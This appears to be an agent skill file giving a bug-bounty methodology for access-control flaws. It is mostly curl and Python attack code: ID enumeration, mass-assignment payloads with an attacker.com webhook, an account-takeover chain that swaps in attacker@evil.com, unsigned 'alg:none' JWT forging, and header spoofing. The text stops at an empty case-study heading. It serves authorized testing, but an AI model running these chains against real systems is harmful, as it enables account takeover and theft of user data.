---
name: broken-access-control
description: IDOR/BOLA, mass assignment, privilege escalation, BFLA — test authorization boundaries with two-account setup, Burp Autorize, and exploit chains
category: authn-authz
---

# Broken Access Control — Complete Testing Methodology

## Overview
Broken access control is OWASP #1 (API Top 10 2023) and the highest-paying
vulnerability class in bug bounty. This skill covers IDOR/BOLA, mass
assignment, vertical/horizontal privilege escalation, and BFLA with
reproducible methodology, tools, and exploit chains.

## Prerequisites
- Two accounts: `attacker` (low-priv) and `victim` (any role to test against)
- Burp Suite Professional (for Autorize extension)
- ffuf, curl, jq, sqlmap (for enumeration)
- Wordlists: C:/Users/S3ck1llr/bughunting-rig/hunting/wordlists/numbers.txt, C:/Users/S3ck1llr/bughunting-rig/hunting/wordlists/parameters.txt

## Two-Account Setup Protocol

### Step 1: Provision accounts
```bash
# Account A: attacker (low privilege)
# Account B: victim (target role/data)
# Use @accounts to provision both with known credentials
# Log both into separate browser sessions or capture both session tokens
```

### Step 2: Capture session tokens
```bash
# From Burp or browser dev tools:
ATTACKER_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
VICTIM_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
TARGET="https://target.com"
```

### Step 3: Identify object IDs
```bash
# Get attacker's own resources to find ID patterns
curl -s -H "Authorization: Bearer $ATTACKER_TOKEN" \
  "$TARGET/api/users/me" | jq '.id, .organizationId, .accountId'

# List endpoints to find enumerable IDs
curl -s -H "Authorization: Bearer $ATTACKER_TOKEN" \
  "$TARGET/api/users" | jq '.[].id'
```

## IDOR / BOLA Testing

### Method 1: Sequential ID Enumeration
```bash
# Test numerical IDs with ffuf
ffuf -u "$TARGET/api/users/FUZZ" \
  -w C:/Users/S3ck1llr/bughunting-rig/hunting/wordlists/numbers.txt \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -mr '"email"' \
  -mc 200 \
  -of json -o tmp/idor-users.json

# Extract valid IDs from results
jq -r '.results[] | select(.length > 0) | .url' tmp/idor-users.json | \
  sed "s|$TARGET/api/users/||" > tmp/valid-ids.txt
```

### Method 2: UUID Enumeration
```bash
# Check if UUIDs are leaked in other endpoints
# Search responses for UUID patterns
curl -s -H "Authorization: Bearer $ATTACKER_TOKEN" \
  "$TARGET/api/organizations/$ORG_ID/members" | \
  grep -oP '[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}' | \
  sort -u > tmp/uuids.txt

# Test each UUID against target endpoint
while read uuid; do
  curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" \
    -H "Authorization: Bearer $ATTACKER_TOKEN" \
    "$TARGET/api/users/$uuid"
done < tmp/uuids.txt
```

### Method 3: Encoded Reference Testing
```bash
# Decode base64 references (SW52b2ljZToxMDQy -> Invoice:1042)
echo "SW52b2ljZToxMDQy" | base64 -d
# Output: Invoice:1042

# Decode hex references
echo "4e6f726d616c4f726465724974656d3a353030" | xxd -r -p
# Output: NormalOrderItem:500

# Test decoded values against endpoints
curl -s -H "Authorization: Bearer $ATTACKER_TOKEN" \
  "$TARGET/api/invoices/1042"
```

### Method 4: Hash-Based ID Enumeration
```bash
# If IDs are hashed (MD5/CRC of small integers), brute-force
python3 -c "
import hashlib
target_hash = '5d41402abc4b2a76b9719d911017c592'  # example MD5
for i in range(1, 10000):
    h = hashlib.md5(str(i).encode()).hexdigest()
    if h == target_hash:
        print(f'Found: {i}')
        break
"
```

### Method 5: Unauthenticated IDOR
```bash
# Strip Authorization header and retry
curl -s -o /dev/null -w "%{http_code}" \
  "$TARGET/api/users/12345"
# If 200, unauthenticated IDOR confirmed
```

### HTTP Method Testing
```bash
# Test all methods on object endpoints
for method in GET POST PUT PATCH DELETE; do
  curl -s -o /dev/null -w "$method: %{http_code}\n" \
    -X $method \
    -H "Authorization: Bearer $ATTACKER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"name":"test"}' \
    "$TARGET/api/users/12345"
done
```

## Mass Assignment Testing (CWE-915)

### Discovery: Full Response Reflection
```bash
# Step 1: GET the resource to see all fields
curl -s -H "Authorization: Bearer $ATTACKER_TOKEN" \
  "$TARGET/api/users/$ATTACKER_USER_ID" | jq '.' > tmp/user-fields.json

# Step 2: Copy response, modify fields, PUT back
# Common fields to inject:
# role, roles, isAdmin, is_admin, permissions, verified, emailVerified
# ownerId, organizationId, tenantId, accountId, userId
# price, discount, credit, balance, limit, refundAmount, status
# templateId, conversionParams, exportFormat, webhookUrl, filePath
```

### Mass Assignment via curl
```bash
# Test privilege escalation via mass assignment
curl -s -X PUT \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "role": "admin",
    "isAdmin": true,
    "permissions": ["read", "write", "admin"],
    "verified": true,
    "emailVerified": true
  }' \
  "$TARGET/api/users/$ATTACKER_USER_ID"

# Test ownership manipulation
curl -s -X PUT \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "organizationId": "'$VICTIM_ORG_ID'",
    "accountId": "'$VICTIM_ACCOUNT_ID'",
    "tenantId": "'$VICTIM_TENANT_ID'"
  }' \
  "$TARGET/api/users/$ATTACKER_USER_ID"
```

### Automated Mass Assignment Testing
```bash
# Generate payload with all suspicious fields
cat > tmp/mass-assign-payload.json << 'PAYLOAD'
{
  "role": "admin",
  "roles": ["admin"],
  "isAdmin": true,
  "is_admin": true,
  "permissions": ["admin"],
  "verified": true,
  "emailVerified": true,
  "kycStatus": "verified",
  "ownerId": "attacker-id",
  "organizationId": "attacker-org",
  "accountId": "attacker-account",
  "tenantId": "attacker-tenant",
  "userId": "attacker-user",
  "price": 0,
  "discount": 100,
  "credit": 999999,
  "balance": 999999,
  "limit": 999999,
  "status": "active",
  "templateId": "admin-template",
  "exportFormat": "full",
  "webhookUrl": "https://attacker.com/webhook"
}
PAYLOAD

# Test against multiple endpoints
for endpoint in /api/users /api/profile /api/settings /api/account; do
  echo "Testing $endpoint..."
  curl -s -X PUT \
    -H "Authorization: Bearer $ATTACKER_TOKEN" \
    -H "Content-Type: application/json" \
    -d @tmp/mass-assign-payload.json \
    "$TARGET$endpoint" | jq '.role, .isAdmin'
done
```

## IDOR + Mass Assignment Chain (Critical)

### Full Chain Execution
```bash
# Step 1: Confirm write IDOR
curl -s -X PUT \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"modified-by-attacker"}' \
  "$TARGET/api/users/$VICTIM_USER_ID"

# Step 2: Add mass assignment to escalate
curl -s -X PUT \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name":"modified-by-attacker",
    "role":"admin",
    "isAdmin":true,
    "permissions":["admin","read","write"]
  }' \
  "$TARGET/api/users/$VICTIM_USER_ID"

# Step 3: Confirm admin access
curl -s -H "Authorization: Bearer $ATTACKER_TOKEN" \
  "$TARGET/admin/dashboard" | grep -i "admin\|welcome"

# Step 4: Escalate to full ATO
curl -s -X POST \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}' \
  "$TARGET/api/users/$VICTIM_USER_ID/email"
```

## Privilege Escalation Vectors

### Vertical Escalation (User -> Admin)

#### Parameter-Based Access Control
```bash
# Test admin parameters in query string
curl -s -H "Authorization: Bearer $ATTACKER_TOKEN" \
  "$TARGET/api/users?admin=true"

curl -s -H "Authorization: Bearer $ATTACKER_TOKEN" \
  "$TARGET/api/users?role=admin"

curl -s -H "Authorization: Bearer $ATTACKER_TOKEN" \
  "$TARGET/api/users?isAdmin=1"

# Test in POST body
curl -s -X POST \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"admin":true,"role":"admin"}' \
  "$TARGET/api/users"
```

#### HTTP Method Override
```bash
# Test if GET bypasses POST-only access control
curl -s "$TARGET/admin/users"  # GET
curl -s -X POST "$TARGET/admin/users"  # POST
curl -s -X PUT "$TARGET/admin/users"  # PUT
curl -s -X DELETE "$TARGET/admin/users"  # DELETE

# Test method override headers
curl -s \
  -H "X-HTTP-Method-Override: GET" \
  -X POST \
  "$TARGET/admin/users"

curl -s \
  -H "X-HTTP-Method-Override: DELETE" \
  -X POST \
  "$TARGET/admin/users"
```

#### URL Matching Discrepancies
```bash
# Test case variations
for path in /admin /Admin /ADMIN /aDmIn; do
  curl -s -o /dev/null -w "%{http_code} $path\n" \
    -H "Authorization: Bearer $ATTACKER_TOKEN" \
    "$TARGET$path"
done

# Test trailing slash variations
for path in /admin /admin/; do
  curl -s -o /dev/null -w "%{http_code} $path\n" \
    -H "Authorization: Bearer $ATTACKER_TOKEN" \
    "$TARGET$path"
done
```

#### Platform Misconfigurations
```bash
# JSONP endpoints
curl -s "$TARGET/api/data?callback=alert(1)"

# CORS misconfiguration
curl -s \
  -H "Origin: https://attacker.com" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  "$TARGET/api/admin/users" -v 2>&1 | grep -i "access-control-allow-origin"

# Proxy path normalization
curl -s "$TARGET/proxy/target.com/admin"
curl -s "$TARGET//admin"
curl -s "$TARGET/./admin"
curl -s "$TARGET/%2e%2e/admin"
```

### Horizontal Escalation (User A -> User B)

```bash
# Change user ID in request
curl -s -H "Authorization: Bearer $ATTACKER_TOKEN" \
  "$TARGET/api/users/$VICTIM_USER_ID/profile"

# Test with GUIDs leaked from other endpoints
VICTIM_GUID=$(curl -s -H "Authorization: Bearer $ATTACKER_TOKEN" \
  "$TARGET/api/organizations/$ORG_ID/members" | \
  jq -r '.[] | select(.role!="admin") | .id' | head -1)

curl -s -H "Authorization: Bearer $ATTACKER_TOKEN" \
  "$TARGET/api/users/$VICTIM_GUID"
```

## BFLA (Broken Function Level Authorization)

### Direct Admin Endpoint Testing
```bash
# Test admin endpoints directly
ADMIN_ENDPOINTS=(
  "/admin"
  "/api/admin"
  "/v1/admin/"
  "/api/v1/admin"
  "/admin/users"
  "/admin/settings"
  "/admin/config"
  "/api/admin/users"
  "/api/admin/settings"
  "/_admin"
  "/adminpanel"
  "/management"
  "/api/management"
)

for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $ATTACKER_TOKEN" \
    "$TARGET$endpoint")
  if [ "$code" != "403" ] && [ "$code" != "404" ]; then
    echo "POTENTIAL BFLA: $endpoint -> $code"
  fi
done
```

### Hidden HTTP Methods on Admin Endpoints
```bash
# Test all methods on admin endpoints
for endpoint in /admin/users /api/admin/config; do
  for method in OPTIONS HEAD TRACE CONNECT; do
    curl -s -o /dev/null -w "$method $endpoint: %{http_code}\n" \
      -X $method \
      -H "Authorization: Bearer $ATTACKER_TOKEN" \
      "$TARGET$endpoint"
  done
done
```

### Role Enumeration via Error Messages
```bash
# Test different role values and observe error messages
for role in admin superadmin root owner manager user guest; do
  response=$(curl -s -H "Authorization: Bearer $ATTACKER_TOKEN" \
    "$TARGET/api/users?role=$role")
  echo "role=$role: $(echo $response | jq -r '.error // .message // "no-error"' 2>/dev/null)"
done
```

## Burp Autorize Configuration

### Setup Autorize
1. Install Autorize extension in Burp
2. Configure two sessions:
   - **High-privilege session**: Victim token (admin or target role)
   - **Low-privilege session**: Attacker token (regular user)

### Autorize Settings
```
Session ID Parameter: Authorization
Session ID Type: HTTP Header
High-privilege session ID: <VICTIM_TOKEN>
Low-privilege session ID: <ATTACKER_TOKEN>
Match condition: Match response length difference
Status code to ignore: 401, 403, 404
Response regex to ignore: "not authorized", "forbidden", "unauthorized"
```

### Autorize Testing Workflow
1. Start Autorize with both sessions configured
2. Browse the application normally with the low-privilege session
3. Autorize silently replays every request with the high-privilege session
4. If the high-privilege session gets a different response (200 vs 403),
   it flags a potential access control issue
5. Review flagged requests in the Autorize tab

### Autorize CLI Alternative (for automation)
```bash
# Use burpsuite or custom script to replay requests with swapped tokens
# Example using curl + diff
test_endpoint() {
  local endpoint=$1
  local low_resp=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: Bearer $ATTACKER_TOKEN" \
    "$TARGET$endpoint")
  local high_resp=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: Bearer $VICTIM_TOKEN" \
    "$TARGET$endpoint")

  local low_code=$(echo "$low_resp" | tail -1)
  local high_code=$(echo "$high_resp" | tail -1)

  if [ "$low_code" != "$high_code" ]; then
    echo "ACCESS CONTROL ISSUE: $endpoint (low: $low_code, high: $high_code)"
  fi
}
```

## Exploit Chains

### Chain 1: IDOR + Mass Assignment = Privilege Escalation
```
1. Find PUT/PATCH endpoint: /api/users/{id}
2. Confirm IDOR: PUT with attacker token to victim's ID -> 200
3. Add mass assignment: role=admin, isAdmin=true
4. Verify: access /admin/dashboard with attacker token
5. Impact: Full account takeover + admin access
```

### Chain 2: Unauthenticated IDOR + Data Exfiltration
```
1. Find endpoint without auth check: /api/users/{id}/profile
2. Enumerate all IDs: ffuf -w numbers.txt
3. Extract sensitive data: emails, names, internal IDs
4. Chain with IDOR on related endpoints: /api/users/{id}/billing
5. Impact: Full user database exfiltration
```

### Chain 3: BFLA + Parameter Pollution = Admin Access
```
1. Find admin endpoint: /api/admin/users
2. Test parameter variations: ?admin=true, ?role=admin
3. If one works, enumerate all admin functions
4. Chain with mass assignment to modify other users
5. Impact: Full admin panel access
```

### Chain 4: HTTP Method Bypass + IDOR
```
1. Find endpoint that checks method: POST /api/admin/action
2. Test GET method: GET /api/admin/action -> 200 (bypasses POST-only check)
3. Add IDOR: GET /api/admin/action?userId={victim_id}
4. Impact: Unauthorized admin action on victim's data
```

## Automated Testing Scripts

### Full IDOR Scan
```bash
#!/bin/bash
# idor-scan.sh - Automated IDOR testing
TARGET="$1"
TOKEN="$2"

echo "[*] Starting IDOR scan on $TARGET"

# Find endpoints with IDs
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api" | \
  grep -oP '"[^"]*id[^"]*":\s*"?[a-zA-Z0-9-]+"?' | \
  sort -u > tmp/id-patterns.txt

# Test each ID pattern
while read pattern; do
  id_value=$(echo "$pattern" | grep -oP '[a-zA-Z0-9-]{3,}$')
  if [ -n "$id_value" ]; then
    # Test sequential variation
    for i in $(seq 1 100); do
      resp=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer $TOKEN" \
        "$TARGET/api/users/$i")
      if [ "$resp" = "200" ]; then
        echo "[+] Valid ID found: $i (HTTP $resp)"
      fi
    done
  fi
done < tmp/id-patterns.txt

echo "[*] IDOR scan complete"
```

### Mass Assignment Fuzzer
```bash
#!/bin/bash
# mass-assign-fuzz.sh - Automated mass assignment testing
TARGET="$1"
TOKEN="$2"

PAYLOADS=(
  '{"role":"admin"}'
  '{"isAdmin":true}'
  '{"is_admin":true}'
  '{"permissions":["admin"]}'
  '{"verified":true}'
  '{"emailVerified":true}'
  '{"ownerId":"attacker"}'
  '{"organizationId":"attacker-org"}'
  '{"accountId":"attacker-account"}'
  '{"tenantId":"attacker-tenant"}'
)

for payload in "${PAYLOADS[@]}"; do
  echo "[*] Testing payload: $payload"
  curl -s -X PUT \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "$payload" \
    "$TARGET/api/users/$USER_ID" | jq '.role, .isAdmin' 2>/dev/null
done
```

## Verification Checklist

### Before Reporting
- [ ] Reproduced from fresh session with attacker account only
- [ ] Demonstrated real impact (data accessed/modified)
- [ ] Copy-paste reproducible steps
- [ ] Survives hostile triage (would a triager pay for this?)
- [ ] Not a pentest checklist finding (self-XSS, missing headers, etc.)

### Impact Evidence
- [ ] Screenshot of victim's data accessed via IDOR
- [ ] Screenshot of admin panel access after escalation
- [ ] Raw HTTP request/response showing unauthorized access
- [ ] Before/after comparison of modified data

## Common False Positives to Avoid
- Endpoints that return same data for all IDs (not IDOR)
- Endpoints that are genuinely public (no auth needed)
- Client-side only access control (test with raw curl)
- Error pages that look like data (check response body)
- Rate limiting that looks like access control (429 vs 403)

## Per-Vector curl Command Reference

### IDOR - Sequential IDs
```bash
# GET with sequential ID
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/users/1"

# PUT with sequential ID
curl -s -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test"}' "$TARGET/api/users/1"

# DELETE with sequential ID
curl -s -X DELETE -H "Authorization: Bearer $TOKEN" "$TARGET/api/users/1"
```

### IDOR - UUID
```bash
# GET with UUID
curl -s -H "Authorization: Bearer $TOKEN" \
  "$TARGET/api/users/550e8400-e29b-41d4-a716-446655440000"
```

### IDOR - Unauthenticated
```bash
# No auth header
curl -s "$TARGET/api/users/1"
```

### Mass Assignment - Role Escalation
```bash
curl -s -X PUT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","isAdmin":true}' \
  "$TARGET/api/users/$USER_ID"
```

### Mass Assignment - Ownership Transfer
```bash
curl -s -X PUT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"organizationId":"victim-org-id","accountId":"victim-account-id"}' \
  "$TARGET/api/users/$USER_ID"
```

### BFLA - Direct Admin Access
```bash
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/admin"
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/admin/users"
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/v1/admin/config"
```

### Parameter-Based Privilege Escalation
```bash
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/users?admin=true"
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/users?role=admin"
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/users?isAdmin=1"
```

### HTTP Method Bypass
```bash
curl -s -X GET "$TARGET/admin/users"
curl -s -H "X-HTTP-Method-Override: GET" -X POST "$TARGET/admin/users"
```

### CORS Misconfiguration
```bash
curl -s -H "Origin: https://attacker.com" \
  -H "Authorization: Bearer $TOKEN" \
  "$TARGET/api/admin/users" -v 2>&1 | grep -i "access-control-allow"
```

## 7. Function-Level Access Control (OWASP #1 API Top 10)

Function-level access control failures occur when API endpoints don't validate the caller's role before executing sensitive operations.

### 7.1 Admin Endpoint Discovery Methodology

```bash
# Phase 1: Discover admin endpoints via common paths
ADMIN_PATHS=(
  "/api/admin"
  "/api/admin/users"
  "/api/admin/settings"
  "/api/admin/config"
  "/api/admin/logs"
  "/api/admin/billing"
  "/api/admin/audit"
  "/api/admin/export"
  "/api/admin/import"
  "/api/admin/backup"
  "/api/admin/feature-flags"
  "/api/admin/environment"
  "/api/admin/health"
  "/api/admin/metrics"
  "/api/admin/debug"
  "/api/admin/migrations"
  "/api/admin/analytics"
  "/api/admin/reports"
  "/api/admin/webhooks"
  "/api/admin/notifications"
  "/api/admin/templates"
  "/api/admin/roles"
  "/api/admin/permissions"
  "/api/admin/api-keys"
)

for path in "${ADMIN_PATHS[@]}"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$path" \
    -H "Authorization: Bearer $TOKEN")
  length=$(curl -s "$TARGET$path" \
    -H "Authorization: Bearer $TOKEN" | wc -c)
  echo "$path -> HTTP $status ($length bytes)"
done

# Phase 2: Discover via ffuf
ffuf -u "$TARGET/api/FUZZ" \
  -w <(echo -e "admin\nadmin/users\nadmin/settings\nadmin/config\nadmin/logs\nadmin/export\nprivate\ninternal\ndashboard\nmanagement\nconsole\noperator\nstaff\nbackend\ndev\nportal\nroot\nsecure\nserver\nsupport\nsystem") \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200,201,401,403 \
  -o admin_endpoints.json

# Phase 3: Method variation on discovered endpoints
jjq -r '.results[].url' admin_endpoints.json | while read url; do
  for method in GET POST PUT PATCH DELETE; do
    curl -s -o /dev/null -w "$method %{http_code}\n" -X "$method" "$url" \
      -H "Authorization: Bearer $TOKEN"
  done
done

# Phase 4: Parameter variation
curl -s "$TARGET/api/admin/users?limit=1" -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/admin/users?admin=true" -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/admin/users?role=admin" -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/admin/users?isAdmin=1" -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/admin/users?internal=true" -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/admin/users?includeAll=true" -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/admin/users?scope=all" -H "Authorization: Bearer $TOKEN"
```

### 7.2 Role Manipulation in JWT / Cookies

```bash
# Step 1: Intercept and decode your JWT
curl -s "$TARGET/api/login" -d '{"email":"user@test.com","password":"test"}'
# JWT: eyJhbGciOiJIUzI1NiIs... (header.payload.signature)

PAYLOAD=$(echo "JWT" | cut -d. -f2 | base64 -d 2>/dev/null)
echo "$PAYLOAD" | jq '.'
# {"sub":"1042","role":"user","iat":1234567890}

# Step 2: Try common role values
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
for role in ['admin', 'administrator', 'superadmin', 'super_admin', 'root', 'system', 'staff', 'moderator', 'owner', 'superuser', 'super_user', 'enterprise', 'premium', 'internal']:
    payload = base64.urlsafe_b64encode(json.dumps({'sub':'1042','role':role,'iat':1234567890}).encode()).rstrip(b'=').decode()
    token = f'{header}.{payload}.'
    status = __import__('requests').get('$TARGET/api/admin/users', headers={'Authorization':f'Bearer {token}'}).status_code
    if status != 403 and status != 401:
        print(f'[!] Role {role}: HTTP {status}')
"

# Step 3: Try role in cookie (not JWT)
curl -s "$TARGET/api/admin/users" \
  -H "Cookie: session=CURRENT_SESSION; role=admin"
curl -s "$TARGET/api/admin/users" \
  -H "Cookie: session=CURRENT_SESSION; user_type=admin"
curl -s "$TARGET/api/admin/users" \
  -H "Cookie: session=CURRENT_SESSION; access=full"
```

### 7.3 Hidden Parameter / Header-Based Access

```bash
# Some admin access is gated by headers or parameters
curl -s "$TARGET/api/internal/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Admin: true"

curl -s "$TARGET/api/admin/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Forwarded-For: 127.0.0.1"

curl -s "$TARGET/api/admin/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Real-IP: 10.0.0.1"

curl -s "$TARGET/api/admin/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Internal: true"

curl -s "$TARGET/api/admin/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Proxy-User: admin"

# Query parameters
curl -s "$TARGET/api/users?admin=true" -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/users?is_admin=1" -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/users?internal=1" -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/users?all=true" -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/users?full_access=true" -H "Authorization: Bearer $TOKEN"

# Internal auth tokens
curl -s "$TARGET/api/admin/users" \
  -H "X-API-Key: internal-api-key-123"
curl -s "$TARGET/api/admin/users" \
  -H "X-Internal-Secret: supers3cret"
curl -s "$TARGET/api/admin/users" \
  -H "X-Auth-Token: admin_service_token"
```

## 8. GraphQL Access Control Testing

GraphQL introduces unique access control challenges because a single endpoint handles all queries and mutations.

### 8.1 Introspection and Schema Extraction

```bash
# Full introspection query
curl -s "$TARGET/graphql" -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,args{name,type{name}}}}}}"}' | jq '.'
```

### 8.2 Resolver-Level Authorization Gaps

```bash
# Test if querying another user's data is allowed
curl -s "$TARGET/graphql" -X POST \
  -H "Authorization: Bearer $TOKEN (uid=1042)" \
  -H "Content-Type: application/json" \
  -d '{"query":"{user(id:1043){id email name role documents{url}}}"}'
# If returns user 1043's data -> GraphQL IDOR

# Mutation-level access control
curl -s "$TARGET/graphql" -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{updateUser(input:{id:1043,role:\"admin\"}){user{id role}}}"}'
# If mutation succeeds -> missing authorization in mutation resolver

# Batch queries to test multiple access points
curl -s "$TARGET/graphql" -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{me:user(id:1042){email}other:user(id:1043){email}admin:user(id:1){email}}"}'

# Alias-based batching for data extraction
curl -s "$TARGET/graphql" -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{u1:user(id:1){email role __typename}u2:user(id:2){email role __typename}u3:user(id:3){email role __typename}u4:user(id:4){email role __typename}}"}'
```

### 8.3 Field-Level Authorization

```bash
# Check if sensitive fields are accessible without specific roles
curl -s "$TARGET/graphql" -X POST \
  -H "Authorization: Bearer $TOKEN (role=user)" \
  -H "Content-Type: application/json" \
  -d '{"query":"{user(id:1042){id email name role ssn ssnLast4 billingInfo{cardNumber} internalNotes{text} isAdmin isSuperuser}}"}' 

# If any admin-only fields are returned -> field-level auth is broken
```

## 9. Automating Access Control Testing

### 9.1 Python Scanner

```python
#!/usr/bin/env python3
"""
Automated access control scanner.
Tests endpoint authorization by swapping user tokens.
"""
import requests
import json
import argparse
import concurrent.futures

class AccessControlScanner:
    def __init__(self, base_url, user_tokens):
        self.base_url = base_url.rstrip('/')
        self.tokens = user_tokens  # {"user": {"token": "...", "uid": 123}, "admin": ...}
        self.sessions = {}
        self.findings = []
        
        for role, data in self.tokens.items():
            s = requests.Session()
            s.headers.update({
                "Authorization": f"Bearer {data['token']}",
                "Content-Type": "application/json"
            })
            self.sessions[role] = s
    
    def test_endpoint(self, method, path, expected_status=403, body=None):
        """Test endpoint access from each role"""
        url = f"{self.base_url}{path}"
        results = {}
        
        for role, session in self.sessions.items():
            try:
                if method == "GET":
                    r = session.get(url)
                elif method == "POST":
                    r = session.post(url, json=body)
                elif method == "PUT":
                    r = session.put(url, json=body)
                elif method == "PATCH":
                    r = session.patch(url, json=body)
                elif method == "DELETE":
                    r = session.delete(url)
                
                results[role] = {
                    "status": r.status_code,
                    "length": len(r.content),
                    "headers": dict(r.headers)
                }
                
                # Check for unexpected access
                if role != "admin" and r.status_code in [200, 201]:
                    self.findings.append({
                        "role": role,
                        "method": method,
                        "path": path,
                        "status": r.status_code,
                        "expected": expected_status,
                        "impact": f"Low-priv {role} accessed {method} {path}"
                    })
                    print(f"[!] {role} -> {method} {path} = {r.status_code} (expected {expected_status})")
            except Exception as e:
                results[role] = {"error": str(e)}
        
        return results
    
    def test_method_bypass(self, path, expected_blocked_methods=None):
        """Test all HTTP methods on an endpoint"""
        if expected_blocked_methods is None:
            expected_blocked_methods = ["GET", "POST", "PUT", "PATCH", "DELETE"]
        
        low_priv_session = self.sessions.get(list(self.tokens.keys())[0])
        
        for method in ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"]:
            try:
                r = low_priv_session.request(method, f"{self.base_url}{path}")
                if r.status_code in [200, 201, 202]:
                    print(f"[!] Method bypass: {method} {path} = {r.status_code}")
                    self.findings.append({
                        "type": "method_bypass",
                        "role": list(self.tokens.keys())[0],
                        "method": method,
                        "path": path,
                        "status": r.status_code
                    })
            except:
                pass
    
    def report(self, output="access_control_findings.json"):
        with open(output, 'w') as f:
            json.dump(self.findings, f, indent=2)
        print(f"\n[+] {len(self.findings)} findings written to {output}")

if __name__ == "__main__":
    scanner = AccessControlScanner(
        "https://target.com",
        {
            "user": {"token": "USER_TOKEN", "uid": 1042},
            "moderator": {"token": "MOD_TOKEN", "uid": 1043},
            "admin": {"token": "ADMIN_TOKEN", "uid": 1}
        }
    )
    
    endpoints = [
        ("GET", "/api/admin/users"),
        ("GET", "/api/admin/settings"),
        ("POST", "/api/admin/users", {"email": "test@test.com", "role": "admin"}),
        ("DELETE", "/api/admin/users/1234"),
        ("PATCH", "/api/admin/settings", {"maintenance_mode": True}),
    ]
    
    for method, path, *body in endpoints:
        scanner.test_endpoint(method, path, body=body[0] if body else None)
        scanner.test_method_bypass(path)
    
    scanner.report()
```

### 9.2 Burp Extender for Authorization

```python
# Burp Autorize alternative - Repeater-based authorization check
# Configure with two user tokens, automatically tests every endpoint

# Step 1: Install Autorize from BApp Store
# Step 2: Configure with victim's session token/cookie
# Step 3: Browse as attacker
# Step 4: Autorize re-sends every request with victim's token
# Step 5: Any 200 response = potential access control failure
```

## 10. Real-World Case Studies

### 10.1 Microsoft — Azure Portal Broken Function-Level Access

A low-privilege user could access Azure Portal admin functions by directly calling internal API endpoints. The frontend hid admin buttons, but the backend didn't validate. Discovered through parameter discovery on `/api/admin/` paths.

### 10.2 Tesla — Vehicle API Access Control

Tesla's vehicle API had a broken access control issue where a user could access another vehicle's data by changing the vehicle_id parameter. Even with GUIDs, the API didn't validate vehicle ownership — just token authenticity.

### 10.3 Facebook — GraphQL Access Control Gap

Facebook's GraphQL API allowed querying private user information by user ID even when the requesting user had no relationship with the target. Multiple resolver-level authorization gaps existed in event, group, and page resolvers.

### 10.4 Slack — Workspace Token Privilege Escalation

A workspace token with restricted scopes could be used to call admin-level API endpoints. The token validation checked the token was valid but not whether the token's scopes allowed the specific operation.

### 10.5 GitHub — Organization Role Manipulation

GitHub had a bug where an organization member could modify the base_permission field for all members via the org settings API. A low-privilege member could escalate themselves and all other members to admin.

### 10.6 GitLab — Project Access Token Privilege Escalation

